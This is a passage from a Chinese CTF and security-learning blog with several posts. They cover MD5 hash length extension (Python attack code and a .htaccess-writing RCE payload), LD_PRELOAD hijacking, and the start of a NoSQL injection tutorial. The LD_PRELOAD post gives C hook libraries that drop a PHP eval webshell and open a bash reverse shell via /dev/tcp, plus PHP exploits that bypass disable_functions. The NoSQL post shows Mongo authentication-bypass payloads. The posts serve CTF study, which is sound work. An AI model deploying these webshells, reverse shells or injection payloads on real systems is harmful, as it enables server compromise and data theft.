\u0026lt; 16: xx = int(fun_list[0], 16) + f(int(fun_list[1], 16), int(fun_list[2], 16), int(fun_list[3], 16)) + int(m[count], 16) + T(Ti_count) xx \u0026amp;= 0xffffffff ll = L(xx, shi[count]) fun_list[0] = hex((int(fun_list[1], 16) + ll) \u0026amp; 0xffffffff) fun_list = shift(fun_list) count += 1 Ti_count += 1 return fun_list def gen_m16(order, ascii_list, f_offset): ii = 0 m16 = [0] * 16 f_offset *= 64 for i in order: i *= 4 m16[ii] = \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join((ascii_list[i + f_offset] + ascii_list[i + 1 + f_offset] + ascii_list[i + 2 + f_offset] + ascii_list[i + 3 + f_offset]).split(\u0026#39;0x\u0026#39;)) ii += 1 for ind in range(len(m16)): m16[ind] = reverse_hex(m16[ind]) return m16 def reverse_hex(hex_str): hex_str = hex_str[2:] if len(hex_str) \u0026lt; 8: hex_str = \u0026#39;0\u0026#39; * (8 - len(hex_str)) + hex_str hex_str_list = [] for i in range(0, len(hex_str), 2): hex_str_list.append(hex_str[i:i + 2]) hex_str_list.reverse() hex_str_result = \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join(hex_str_list) return hex_str_result def show_result(f_list): result = \u0026#39;\u0026#39; f_list1 = [0] * 4 for i in f_list: f_list1[f_list.index(i)] = reverse_hex(i)[2:] result += f_list1[f_list.index(i)] return result def padding(input_m, msg_lenth=0): ascii_list = list(map(hex, map(ord, input_m))) msg_lenth += len(ascii_list) * 8 ascii_list.append(\u0026#39;0x80\u0026#39;) for i in range(len(ascii_list)): if len(ascii_list[i]) \u0026lt; 4: ascii_list[i] = \u0026#39;0x\u0026#39; + \u0026#39;0\u0026#39; + ascii_list[i][2:] while (len(ascii_list) * 8 + 64) % 512 != 0: ascii_list.append(\u0026#39;0x00\u0026#39;) msg_lenth_0x = hex(msg_lenth)[2:] msg_lenth_0x = \u0026#39;0x\u0026#39; + msg_lenth_0x.rjust(16, \u0026#39;0\u0026#39;) msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[2:] msg_lenth_0x_list = [] for i in range(0, len(msg_lenth_0x_big_order), 2): msg_lenth_0x_list.append(\u0026#39;0x\u0026#39; + msg_lenth_0x_big_order[i: i + 2]) ascii_list.extend(msg_lenth_0x_list) return ascii_list def md5(input_m): global Ti_count Ti_count = 1 abcd_list = [\u0026#39;0x67452301\u0026#39;, \u0026#39;0xefcdab89\u0026#39;, \u0026#39;0x98badcfe\u0026#39;, \u0026#39;0x10325476\u0026#39;] ascii_list = padding(input_m) for i in range(0, len(ascii_list) // 64): aa, bb, cc, dd = abcd_list order_1 = gen_m16(m_1, ascii_list, i) order_2 = gen_m16(m_2, ascii_list, i) order_3 = gen_m16(m_3, ascii_list, i) order_4 = gen_m16(m_4, ascii_list, i) abcd_list = fun(abcd_list, F, order_1, shi_1) abcd_list = fun(abcd_list, G, order_2, shi_2) abcd_list = fun(abcd_list, H, order_3, shi_3) abcd_list = fun(abcd_list, I, order_4, shi_4) output_a = hex((int(abcd_list[0], 16) + int(aa, 16)) \u0026amp; 0xffffffff) output_b = hex((int(abcd_list[1], 16) + int(bb, 16)) \u0026amp; 0xffffffff) output_c = hex((int(abcd_list[2], 16) + int(cc, 16)) \u0026amp; 0xffffffff) output_d = hex((int(abcd_list[3], 16) + int(dd, 16)) \u0026amp; 0xffffffff) abcd_list = [output_a, output_b, output_c, output_d] Ti_count = 1 print(ascii_list) return show_result(abcd_list) # md5-Length Extension Attack: 计算 md5(message + padding + suffix), res = md5(message), len_m = len(message) def md5_lea(suffix, res, len_m): global Ti_count Ti_count = 1 abcd_list = [] for i in range(0, 32, 8): abcd_list.append(reverse_hex(\u0026#39;0x\u0026#39; + res[i: i + 8])) # print(abcd_list) ascii_list = padding(suffix, (len_m + 72) // 64 * 64 * 8) # len(message + padding) * 8 # print(ascii_list) for i in range(0, len(ascii_list) // 64): aa, bb, cc, dd = abcd_list order_1 = gen_m16(m_1, ascii_list, i) order_2 = gen_m16(m_2, ascii_list, i) order_3 = gen_m16(m_3, ascii_list, i) order_4 = gen_m16(m_4, ascii_list, i) abcd_list = fun(abcd_list, F, order_1, shi_1) abcd_list = fun(abcd_list, G, order_2, shi_2) abcd_list = fun(abcd_list, H, order_3, shi_3) abcd_list = fun(abcd_list, I, order_4, shi_4) output_a = hex((int(abcd_list[0], 16) + int(aa, 16)) \u0026amp; 0xffffffff) output_b = hex((int(abcd_list[1], 16) + int(bb, 16)) \u0026amp; 0xffffffff) output_c = hex((int(abcd_list[2], 16) + int(cc, 16)) \u0026amp; 0xffffffff) output_d = hex((int(abcd_list[3], 16) + int(dd, 16)) \u0026amp; 0xffffffff) abcd_list = [output_a, output_b, output_c, output_d] Ti_count = 1 # print(ascii_list) return show_result(abcd_list) def url_append(hex_bit): len_append = \u0026#39;0x{}{}\u0026#39;.format( (18-len(hex_bit))*\u0026#39;0\u0026#39;, hex_bit[2:]) len_append = reverse_hex(len_append)[2:] # print(len_append) t = \u0026#39;\u0026#39; for i in range(len(len_append)): if i % 2 ==0 : t += \u0026#39;%\u0026#39;+len_append[i:i+2] else: pass return t if __name__ == \u0026#39;__main__\u0026#39;: \u0026#39;\u0026#39;\u0026#39; 修改res为已知哈希值 extend 为拓展值 自动遍历出1-30长度的payload url编码表达式 \u0026#39;\u0026#39;\u0026#39; res = \u0026#39;1c3de59d2f68788cc792e0eb7d604710\u0026#39; extend = \u0026#39;}\u0026#39; # print(reverse_hex(\u0026#39;0x\u0026#39; + res)) for i in range(45): hex_bit = hex(i*8) t = url_append(hex_bit) print(\u0026#39;[%d]\u0026#39; % i,md5_lea(extend,res,i)) # print(\u0026#39;{}%80{}{}{}\u0026#39;.format(\u0026#39;X\u0026#39;*i, (55-i)*\u0026#39;%00\u0026#39;,t, extend) ) print(\u0026#39;%80{}{}{}\u0026#39;.format((55-i)*\u0026#39;%00\u0026#39;,t, extend) ) # print(\u0026#39;{}{}\u0026#39;.format( hex(i), (18-len(hex(i)))*\u0026#39;0\u0026#39;) ) # from urllib.parse import unquote # print(md5_lea(\u0026#39;kingkk\u0026#39;,\u0026#39;571580b26c65f306376d4f64e53cb5c7\u0026#39;,10)) DEMO2 #\r这个是kengwang师傅出的一道题目\n\u0026lt;?php highlight_file(__FILE__); include \u0026#39;secret.php\u0026#39;; $input = base64_decode($_REQUEST[\u0026#39;content\u0026#39;]); $userhash = $_REQUEST[\u0026#39;hash\u0026#39;]; $content = $secret . $input; if (md5($secret) !== \u0026#39;37870febc8d470109a867802b8031454\u0026#39;) { exit(\u0026#34;No no, Don\u0026#39;t change the secret.\u0026#34;); } echo \u0026#34;Secret\u0026#39;s length is \u0026#34; . strlen($secret) . \u0026#34; \u0026#34;; $hash = md5($content); // Is that enough? Let\u0026#39;s see... if (strlen($userhash) == 32 \u0026amp;\u0026amp; $hash === $userhash) { echo \u0026#34;Congratulations! I will write your input into file.\u0026#34;; $filename = explode(\u0026#34;[[\u0026#34;, $input)[1]; // take it easy, i will change the return for you $filename = str_replace(\u0026#34;\\\\n\u0026#34;, \u0026#34;\\n\u0026#34;, str_replace(\u0026#34;\\0\u0026#34;,\u0026#39;\u0026#39;,$filename)); $content = $secret . $filename; file_put_contents($filename, $content); } else { exit(\u0026#34;Think Extensively.\u0026#34;); } 这里同样也给出了加密前的secret的md5值，我们这里就当做data也就是demo1的yusa是空值即可。 当然因为这里加入了死亡杂糅的内容所以这里我放出wp，其实总的来说还是上面分析的方法。\n我们可以使用 hash_extender 这个工具来进行哈希长度扩展攻击, 生成新的密文\n首先考虑将secret写入到一个文件中\n执行:\nhash_extender -s 37870febc8d470109a867802b8031454 -a \u0026#34;[[a.txt\u0026#34; -f md5 -l 13 -d \u0026#39;\u0026#39; 得到:\nType: md5 Secret length: 13 New signature: 4f150e4b71070951112f56be4044c181 New string: 8000000000000000000000000000000000000000000000000000000000000000000000000000000000000068000000000000005b5b612e747874 可能需要用 CyberChef 套 From Hex (Auto) - To Base64\n发送:\nPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: dino-ctf.kengwang.com.cn:32857 hash=4f150e4b71070951112f56be4044c181\u0026amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAAAAAAW1thLnR4dA 访问 a.txt\n发现secret是\u0026lt;?php die(); , 接下来是死亡 die 绕过\n这里需要用到伪协议的一些技巧:\n首先利用 string.strip_tags 的过滤器链吞掉之前的死亡 die, 然后再在后面接上你想要写的内容\n这里使用写 .htaccess 的方法来实现rce, 直接加个 auto_prepend_file 即可\n构造出 php://filter/write=string.strip_tags/?\u0026gt;php_value auto_prepend_file flag\\n#/resource=.htaccess\nhash_extender -s 37870febc8d470109a867802b8031454 -a \u0026#34;[[php://filter/write=string.strip_tags/?\u0026gt;php_value auto_prepend_file flag\\n#/resource=.htaccess\u0026#34; -f md5 -l 13 -d \u0026#39;\u0026#39; 最终 payload:\nPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: 127.0.0.1:32768 hash=473640a1e1ec5efa6bdaf4c7c8f04482\u0026amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAAAAAAW1twaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnN0cmlwX3RhZ3MvPz5waHBfdmFsdWUgYXV0b19wcmVwZW5kX2ZpbGUgZmxhZ1xuIy9yZXNvdXJjZT0uaHRhY2Nlc3M 即可写入\nConclusion #\r总的来说，这个攻击方法还是很好玩的，只不过发现市面上很多的文章写的不尽人意，看了一天都可能不明白其中的原理，写的过于抽象所以想着写写。 只要我们注意到MD5中加密过程中的填充和多轮压缩，并且利用即可，当然也有很多工具可以生成一些playload，这个就不放出来了。 最后感谢kengwang师傅，x1r0z师傅的指导\n参考文章： 1、 https://xz.aliyun.com/t/10602 2、 https://github.com/iagox86/hash_extender\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/","section":"Posts","summary":"","title":"深入浅出-Hash长度拓展攻击","type":"posts"},{"content":"0x0f前言 #\r最近也是打了一些比赛，在VNCTF中看见了这个LD_PRELOAD于是来学习一下（似乎p神的文章也是有写的）这里结合了很多篇文章（比赛频率得降低一点不然天天都在打比赛没时间研究东西了） 也是好久也没有更新博客了。\n0x01基础知识 #\rwhat is LD_PRELOAD #\rLD_PRELOAD是Linux/Unix系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 但是也是分情况的： To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded. 也就是如果ruid != euid的时候加载器会忽略LD_PRELOAD\nLinking of programs #\r首先可以看看一个文件转换为一个可执行程序的活动：\n驱动首先运行cpp将main.c转化为ASCII中间文件main.i 接下来，驱动运行ccl，将main.i转化为ASCII汇编语言文件main.s 然后用as转化为二进制目标文件main.o 最后运行链接器ID，结合了main.o和sum.o创建可执行对象 shell 调用操作系统中称为loader的函数，该函数将可执行文件 prog 中的代码和数据复制到内存中，然后将控制权转移到程序的开头 Static Linking #\r静态链接器（例如 Linux ld程序（在编译器驱动程序中使用））将可重定位目标文件和命令行参数的集合作为输入，并生成可加载和运行的完全链接的可执行目标文件作为输出。输入可重定位目标文件由各种代码和数据部分组成，其中每个部分都是连续的字节序列。指令位于一个部分，已初始化的全局变量位于另一部分，未初始化的变量位于另一部分,并且在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。 而在构建可执行文件的时候linker需要执行两个主要的任务\nSymbol resolution（符号解析）:目标文件定义和引用符号 Relocation（搬迁）:编译器和汇编器生成从地址 0 开始的代码和数据节。 Object Files #\r而前面说的符号解析中的目标文件的定义，那么目标文件有几种类型呢？ Object files come in three forms:\nRelocatable object file(可重定位目标文件) 包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件组合以创建可执行目标文件。 Executable object file(可执行目标文件) 包含可以直接复制到内存并执行的形式的二进制代码和数据。 Shared object file(共享对象文件) 一种特殊类型的可重定位目标文件，可以在加载时或运行时加载到内存中并动态链接。 编译器和汇编器生成可重定位目标文件，链接器可以生成可执行目标文件，对象文件根据特定的对象文件格式进行组织，该格式因系统而异。\nRelocatable object file #\r这里的话也是直接拿ELF文件做例子 这个是典型的EFI文件格式。 ELF 标头以 16 字节序列开始，描述生成文件的系统的字大小和字节顺序。ELF 头的其余部分包含允许链接器解析和解释目标文件的信息。 ~~偷懒粘贴一下~~~ **.text**已编译程序的机器代码。\n**.rodata**只读数据，例如 printf 语句中的格式字符串、switch 语句的跳转表。\n**.data**初始化的全局和静态 C 变量。局部 C 变量在运行时在堆栈上维护，不会出现在 .data 或 .bss 部分中。\n**.bss**未初始化的全局和静态 C 变量，以及初始化为零的任何全局或静态变量。该部分在目标文件中不占用实际空间；它只是一个占位符。目标文件格式区分已初始化变量和未初始化变量以提高空间效率：未初始化变量不必占用目标文件中的任何实际磁盘空间。在运行时，这些变量在内存中分配，初始值为零。\n**.symtab**符号表，其中包含有关程序中定义和引用的函数和全局变量的信息。一些程序员错误地认为必须使用 -g 选项编译程序才能获取符号表信息。事实上，每个可重定位目标文件在 .symtab 中都有一个符号表（除非程序员使用 strip 命令专门将其删除）。但是，与编译器内的符号表不同，.symtab 符号表不包含局部变量的条目。\n.rel.text .text 节中的位置列表，当链接器将此目标文件与其他文件组合时需要修改这些位置。一般来说，任何调用外部函数或引用全局变量的指令都需要修改。另一方面，调用局部函数的指令不需要修改。请注意，可执行目标文件中不需要重定位信息，并且通常会省略重定位信息，除非用户明确指示链接器包含它。\n**.rel.data**模块引用或定义的任何全局变量的重定位信息。一般来说，任何初始值为全局变量或外部定义函数的地址的已初始化全局变量都需要修改。\n**.debug**调试符号表，其中包含程序中定义的局部变量和 typedef、程序中定义和引用的全局变量以及原始 C 源文件的条目。仅当使用 -g 选项调用编译器驱动程序时它才存在。\n**.line**原始 C 源程序中的行号与 .text 部分中的机器代码指令之间的映射。仅当使用 -g 选项调用编译器驱动程序时它才存在。\n.strtab .symtab 和 .debug 节中的符号表以及节标题中的节名称的字符串表。字符串表是一系列以空字符结尾的字符串。\nExecutable object file #\r可执行目标文件的格式与可重定位目标文件的格式类似。ELF 标头描述了文件的整体格式。它还包括程序的入口点，即程序运行时要执行的第一条指令的地址。 .text 、.rodata和.data_节与可重定位目标文件中的节类似，只不过这些节已被重定位到其最终的运行时内存地址。 .init_部分定义了一个名为___init的小函数，它将由程序的初始化代码调用。由于可执行文件是_完全链接_（重定位）的，因此它不需要.rel部分。\nLink with static linker #\r静态链接库，在Linux下文件名后缀为.a，如libstdc++.a。在编译链接时直接将目标代码加入可执行程序。 在链接的时候，链接器只会复制程序应用的目标模块来减少可执行程序的大小。 具体的链接过程这里就不写了。\nDynamic Linking with Shared Libraries #\r静态库缺点的现代创新。共享库是一个对象模块，可以在运行时或加载时加载到任意内存地址并与内存中的程序链接。此过程称为_动态链接，由称为__动态链接器_的程序执行。共享库也称为共享对象，在 Linux 系统上它们由_.so_后缀表示。 Microsoft 操作系统大量使用共享库，他们将其称为 DLL（动态链接库）。 这个是与共享库动态链接过程图 为了构建示例向量例程的共享库_libvector.so_，我们使用一些针对编译器和链接器的特殊指令来调用编译器驱动程序： linux\u0026gt; gcc -shared -fpic -o libvector.so addvec.c multvec.c -fpic表示编译器生成与位置无关的代码。-shared表示让链接器创建共享对象文件 链接： linux\u0026gt; gcc -o prog2l main.c ./libvector.so 这样去创建了一个可执行文件prog2l，但是需要注意的是，libvector里面的任何数据都不会实际的复制到可执行文件当中，而是进行了引用。\nFile name rules for dynamic link libraries #\rlibname.so.x.y.z\nlib：统一前缀。 so：统一后缀。 name：库名，如libstdc++.so.6.0.21的name就是stdc++。 x： 主版本号 。表示库有重大升级，不同主版本号的库之间是不兼容的。如libstdc++.so.6.0.21的主版本号是6。 y： 次版本号 。表示库的增量升级，如增加一些新的接口。在主版本号相同的情况下， 高的次版本号向后兼容低的次版本号 。如libstdc++.so.6.0.21的次版本号是0。 z： 发布版本号 。表示库的优化、bugfix等。相同的主次版本号，不同的发布版本号的库之间 完全兼容 。如libstdc++.so.6.0.21的发布版本号是21。 Dynamic link library search path search sequence #\r编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）； 环境变量LD_LIBRARY_PATH指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）； 配置文件/etc/ld.so.conf中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）； 默认的动态库搜索路径/lib； 默认的动态库搜索路径/usr/lib； 0x02EXPLOITION #\rdemo #\r攻击过程：\n定义一个函数，函数的名称、变量及变量类型、返回值及返回值类型都要与要替换的函数完全一致。这就要求我们在写动态链接库之前要先去翻看一下对应手册等。 将所写的 c 文件编译为动态链接库。 对 LD_PRELOAD 及逆行设置，值为库文件路径，接下来就可以实现对目标函数原功能的劫持了 结束攻击，使用命令 unset LD_PRELOAD 即可 这里取VNCTF2024的givenphp的题目作为demo\n\u0026lt;?php highlight_file(__FILE__); if(isset($_POST[\u0026#39;upload\u0026#39;])){ handleFileUpload($_FILES[\u0026#39;file\u0026#39;]); } if(isset($_GET[\u0026#39;challenge\u0026#39;])){ waf(); $value=$_GET[\u0026#39;value\u0026#39;]; $key=$_GET[\u0026#39;key\u0026#39;]; $func=create_function(\u0026#34;\u0026#34;,\u0026#34;putenv(\u0026#39;$key=$value\u0026#39;);\u0026#34;); if($func==$_GET[\u0026#39;guess\u0026#39;]){ $func(); system(\u0026#34;whoami\u0026#34;); } } function waf() { if(preg_match(\u0026#39;/\\\u0026#39;|\u0026#34;|%|\\(|\\)|;|bash/i\u0026#39;,$_GET[\u0026#39;key\u0026#39;])||preg_match(\u0026#39;/\\\u0026#39;|\u0026#34;|%|\\(|\\)|;|bash/i\u0026#39;,$_GET[\u0026#39;value\u0026#39;])){ die(\u0026#34;evil input!!!\u0026#34;); } } function handleFileUpload($file) { $uploadDirectory = \u0026#39;/tmp/\u0026#39;; if ($file[\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) { echo \u0026#39;文件上传失败。\u0026#39;; return; } $fileExtension = pathinfo($file[\u0026#39;name\u0026#39;], PATHINFO_EXTENSION); $newFileName = uniqid(\u0026#39;uploaded_file_\u0026#39;, true) . \u0026#39;.\u0026#39; . $fileExtension; $destination = $uploadDirectory . $newFileName; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $destination)) { echo $destination; } else { echo \u0026#39;文件移动失败。\u0026#39;; } } 我们只看对环境做操作的部分\n$func=create_function(\u0026#34;\u0026#34;,\u0026#34;putenv(\u0026#39;$key=$value\u0026#39;);\u0026#34;); if($func==$_GET[\u0026#39;guess\u0026#39;]){ $func(); system(\u0026#34;whoami\u0026#34;); } } 看一下whoami调用的静态链接库 可以看见这里调用了很多。利用puts\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int platload() { system(\u0026#34;echo \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39; \u0026gt; /var/www/html/shell.php\u0026#34;); } int puts(const char *message){ if(getenv(\u0026#34;LD_PRELOAD\u0026#34;==NULL)){ return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); playload(); } 这里可以写马也可以写反弹shell也可以写其他的。 编译一下上传即可。 这里我也贴一下Mon0day师傅的demo whoami.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char name[] = \u0026#34;mon\u0026#34;; if (argc \u0026lt; 2) { printf(\u0026#34;usage: %s \u0026lt;given-name\u0026gt;\\n\u0026#34;, argv[0]); return 0; } if (!strcmp(name, argv[1])) { printf(\u0026#34;\\033[0;32;32mYour name Correct!\\n\\033[m\u0026#34;); return 1; } else { printf(\u0026#34;\\033[0;32;31mYour name Wrong!\\n\\033[m\u0026#34;); return 0; } } hook_strcmp.c\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int strcmp(const char *s1, const char *s2) { if (getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); return 0; } 最后编译后也是无论输入什么都是返回correct\n0x03 bypass #\rbypass disable_function #\r众所周知，在实战中遇到disable的时候是可以利用LD_PRELOAD进行绕过的 利用条件，存在putenv,mail，error_log这些可以对环境变量进行操作的函数\nmail #\rhook_getuid.c\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void payload() { system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } uid_t getuid() { if (getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); payload(); } exp:\n\u0026lt;?php putenv(\u0026#39;LD_PRELOAD=/var/www/html/hook_getuid.so\u0026#39;); // 注意这里的目录要有访问权限 mail(\u0026#34;a@localhost\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;); ?\u0026gt; error_log #\r同样也会调用sendmail，所以基本原理和mail的一样这里不在赘述。 exp:\n\u0026lt;?php putenv(\u0026#39;LD_PRELOAD=/var/www/html/hook_getuid.so\u0026#39;); error_log(\u0026#34;\u0026#34;,1\u0026#34;\u0026#34;,\u0026#34;\u0026#34;); ?\u0026gt; hijack system\u0026rsquo;s process #\r这里mon0day师傅还写出了一个新的方法去进行getshell 因为在有些系统里面没有安装sendmail的情况。 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n这里在gcc中发现了__attribute__((constructor))修饰符，在main之前进行执行，也就是说只要我们的文件被执行，那么直接就会被劫持getshell\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } _attribute_((constructor)) #\r#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\u0026#34;EVIL_CMDLINE\u0026#34;); // unset environment variable LD_PRELOAD. // unsetenv(\u0026#34;LD_PRELOAD\u0026#34;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \u0026#34;LD_PRELOAD\u0026#34;)) { environ[i][0] = \u0026#39;\\0\u0026#39;; } } // executive command system(cmdline); } bypass File suffix #\r其实就是后缀名包括但不限于so都可以被执行，后缀名被ban的时候可bypass\n0x04 Conculsion #\r其实这个漏洞的本质就是利用linker对环境变量进行覆盖操作从而绕过一些函数的限制进行getshell，这让我不禁想起在n1junior2024中的那道golang的环境变量注入rce，都是对环境变量进行注入进行rce，后续康康研究下那道题目（没解出来太菜了www）\n参考文章： https://forum.butian.net/share/1493 https://medium.com/@hovakimyan29/demystifying-linking-in-software-development-931e67d48fad\n","date":"21 February 2024","externalUrl":null,"permalink":"/posts/ld_preload/","section":"Posts","summary":"","title":"LD_PRELOAD学习","type":"posts"},{"content":"","date":"21 February 2024","externalUrl":null,"permalink":"/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/","section":"Tags","summary":"","title":"环境变量注入","type":"tags"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/tags/nosql/","section":"Tags","summary":"","title":"NOSQL","type":"tags"},{"content":"NoSQL Inject #\rNoSQL(NOT ONLY SQL)，它和我们常见的sql注入很像。 它的危害有：\n绕过身份验证或保护机制。 提取或编辑数据。 导致拒绝服务。 在服务器上执行代码。 其实注入的本质都是一样的，只是语法有些不一样 0x001 NoSQL database #\rNoSQL 数据库以传统 SQL 关系表以外的格式存储和检索数据。它们旨在处理大量非结构化或半结构化数据。因此，它们通常比 SQL 具有更少的关系约束和一致性检查，并且在可扩展性、灵活性和性能方面具有显着的优势。\n与 SQL 数据库一样，用户使用应用程序传递到数据库的查询与 NoSQL 数据库中的数据进行交互。然而，不同的NoSQL数据库使用多种查询语言，而不是像SQL（结构化查询语言）这样的通用标准。这可能是自定义查询语言或通用语言（如 XML 或 JSON）。（所以黑客可以使用过程性的语言而不是sql来进行攻击，并且可能会比传统的sql注入更具有危害性。）\nNoSQL 数据库不支持一种标准化查询语言，因此允许的确切查询取决于：\n数据库引擎— 例如 MongoDB、Cassandra、Redis 或 Google Bigtable 编程语言— 例如 Python、PHP 开发框架——例如 Angular、Node.js 0x002NoSQL database models #\r类型 部分代表 特点 列存储 Hbase\nCassandra\nHypertable 顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。 文档存储 MongoDB\nCouchDB 文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。 key-value存储 Tokyo Cabinet / Tyrant\nBerkeley DB\nMemcacheDB\nRedis 可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能） 图存储 Neo4J\nFlockDB 图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。 对象存储 db4o\nVersant 通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。 xml数据库 Berkeley DB XML\nBaseX 高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。 0x003注入的类型 #\r有两种 NoSQL 注入分类的方式：\n第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。\n第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。\n重言式注入 又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。\n联合查询注入 联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。\nJavaScript 注入 MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。\n盲注 当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。 在portswigger中的解释：\n语法注入 当您可以破坏 NoSQL 查询语法，从而使您能够注入自己的有效负载时，就会发生这种情况。该方法与 SQL 注入中使用的方法类似。然而，攻击的性质差异很大，因为 NoSQL 数据库使用一系列查询语言、查询语法类型和不同的数据结构。 运算符注入 - 当您可以使用 NoSQL 查询运算符来操作查询时，就会发生这种情况。 0x004判断是否存在注入点 #\r这里我就拿portswigger的在线lab做例子，就不额外搭建环境了 这里首先是一个商城的界面，随便点击一个category url: /filter?category=Accessories 可以看见这里有类似于查询的意思，我们输入一个单引号试试 可以看见报错了，报错内容：\nCommand failed with error 139 (JSInterpreterFailure): \u0026#39;SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 \u0026#39; on server 127.0.0.1:27017. The full response is {\u0026#34;ok\u0026#34;: 0.0, \u0026#34;errmsg\u0026#34;: \u0026#34;SyntaxError: unterminated string literal :\\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\\n\u0026#34;, \u0026#34;code\u0026#34;: 139, \u0026#34;codeName\u0026#34;: \u0026#34;JSInterpreterFailure\u0026#34;} 很明显可以看见mogodb的操作。那么我们还要判断他是否会把url的内容带入数据库查询，所以我们构造Accessories'\u0026amp;\u0026amp; 0 \u0026amp;\u0026amp; 'x 可以看见是返回正常的，说明这里存在注入,我们再构造一次为真的条件，就会发现会返回所有商品信息，playload:https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=accessories%27%7c%7c1%7c%7c%27\n也就是accessories\u0026rsquo;||\u0026lsquo;1\u0026rsquo;==\u0026lsquo;1\u0026rsquo; Inject function #\r重言式注入 #\rvar user = db.users.find({\u0026#34;username\u0026#34;: userInputUsername, \u0026#34;password\u0026#34;: userInputPassword}); 攻击者可以构造{\u0026quot;$gt\u0026quot;:\u0026quot;\u0026quot;}来进行绕过\nvar user = db.users.find({\u0026#34;username\u0026#34;: \u0026#34;administrator\u0026#34;, \u0026#34;password\u0026#34;: {\u0026#34;$gt\u0026#34;: \u0026#34;\u0026#34;}}); MongoDB 中的运算\u0026quot;$gt\u0026quot;符的意思是“大于”。通过将该值设置为空字符串，攻击者可以绕过身份验证，因为查询将返回用户名和密码大于空字符串的第一个用户。\n这里也放一下Marcus_Holloway师傅的index.php\n\u0026lt;?php $manager = new 